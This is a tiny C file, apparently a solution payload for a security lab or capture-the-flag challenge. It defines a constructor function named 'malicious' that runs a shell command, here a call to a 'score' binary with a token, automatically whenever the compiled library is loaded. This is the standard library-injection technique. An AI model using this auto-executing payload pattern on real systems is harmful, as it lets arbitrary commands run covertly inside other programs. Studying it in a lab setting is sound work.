#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
  system("/usr/local/bin/score d82a449e-399b-4ac4-81b3-bf0e72ea3054");
}
